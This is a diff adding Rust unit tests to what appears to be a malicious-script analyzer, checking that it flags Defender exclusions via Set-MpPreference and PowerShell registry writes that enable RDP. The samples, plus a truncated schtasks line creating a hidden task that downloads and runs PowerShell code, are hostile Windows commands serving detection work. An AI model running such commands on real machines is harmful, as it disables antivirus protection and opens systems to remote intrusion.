@@ -2668,6 +2668,30 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn set_mppreference_exclusions_emit_defender_evasion_traits() {
+        let script = br#"powershell -Command "Set-MpPreference -ExclusionPath 'C:\Users\Public' -ExclusionProcess calc.exe"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for (action, target) in [
+            ("exclusion-path", r"C:\Users\Public"),
+            ("exclusion-process", "calc.exe"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion {
+                        action: existing_action,
+                        target: existing_target,
+                    } if existing_action == action && existing_target == target
+                )),
+                "missing DefenderEvasion {action}={target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn defender_registry_tampering_emits_evasion_trait() {
         // `reg add ...\Windows Defender\... /v DisableX /d 1` — flips
         // Defender policy keys to disable real-time / anti-spyware /
@@ -3382,6 +3406,24 @@ powershell -Command "[Windows.Forms.Clipboard]::SetText('copied')"
                 report.traits
             );
         }
+    }
+
+    #[test]
+    fn powershell_terminal_server_registry_writes_emit_remote_access_traits() {
+        let script = br#"powershell -Command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0"
+powershell -Command "New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name AllowTSConnections -PropertyType DWord -Value 1 -Force"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-enable" && target == "Terminal Server"
+            )),
+            "missing PowerShell Terminal Server RDP enablement: {:?}",
+            report.traits
+        );
     }
 
     #[test]
